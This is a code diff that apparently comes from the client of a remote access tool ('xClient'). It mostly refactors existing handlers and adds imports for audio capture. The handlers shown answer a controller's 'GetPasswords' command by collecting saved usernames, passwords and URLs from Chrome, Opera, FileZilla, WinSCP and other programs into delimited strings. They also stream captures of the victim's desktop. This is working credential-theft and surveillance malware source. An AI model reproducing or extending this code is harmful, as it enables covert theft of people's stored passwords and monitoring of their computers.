@@ -9,7 +9,14 @@ using xClient.Core.Networking;
 using xClient.Core.Utilities;
 using xClient.Enums;
 using System.Collections.Generic;
+using System.Management;
 using xClient.Core.Data;
+using xClient.Core.NAudio;
+using xClient.Core.NAudio.Wave.MmeInterop;
+using xClient.Core.NAudio.Wave.WaveFormats;
+using xClient.Core.NAudio.Wave.WaveInputs;
+using xClient.Core.Packets.ClientPackets;
+using xClient.Core.Packets.ServerPackets;
 using xClient.Core.Recovery.Browsers;
 using xClient.Core.Recovery.FtpClients;
 
@@ -20,7 +27,7 @@ namespace xClient.Core.Commands
     {
         public static void HandleGetPasswords(Packets.ServerPackets.GetPasswords packet, Client client)
         {
-            List<RecoveredAccount> recovered = new List<RecoveredAccount>();
+            var recovered = new List<RecoveredAccount>();
 
             recovered.AddRange(Chrome.GetSavedPasswords());
             recovered.AddRange(Opera.GetSavedPasswords());
@@ -30,11 +37,14 @@ namespace xClient.Core.Commands
             recovered.AddRange(FileZilla.GetSavedPasswords());
             recovered.AddRange(WinSCP.GetSavedPasswords());
 
-            List<string> raw = new List<string>();
+            var raw = new List<string>();
 
-            foreach (RecoveredAccount value in recovered)
-            {
-                string rawValue = string.Format("{0}{4}{1}{4}{2}{4}{3}", value.Username, value.Password, value.URL, value.Application, DELIMITER);
+            for (var i = 0; i < recovered.Count; i++) {
+                var value = recovered[i];
+                var rawValue = string.Format($"{value.Username}" + $"{DELIMITER}" +
+                                             $"{value.Password}" + $"{DELIMITER}" +
+                                             $"{value.URL}" + $"{DELIMITER}" +
+                                             $"{value.Application}");
                 raw.Add(rawValue);
             }
 
@@ -51,8 +61,7 @@ namespace xClient.Core.Commands
             if (StreamCodec.ImageQuality != command.Quality || StreamCodec.Monitor != command.Monitor
                 || StreamCodec.Resolution != resolution)
             {
-                if (StreamCodec != null)
-                    StreamCodec.Dispose();
+                StreamCodec?.Dispose();
 
                 StreamCodec = new UnsafeStreamCodec(command.Quality, command.Monitor, resolution);
             }
@@ -65,7 +74,7 @@ namespace xClient.Core.Commands
                 desktopData = desktop.LockBits(new Rectangle(0, 0, desktop.Width, desktop.Height),
                     ImageLockMode.ReadWrite, desktop.PixelFormat);
 
-                using (MemoryStream stream = new MemoryStream())
+                using (var stream = new MemoryStream())
                 {
                     if (StreamCodec == null) throw new Exception("StreamCodec can not be null.");
                     StreamCodec.CodeImage(desktopData.Scan0,
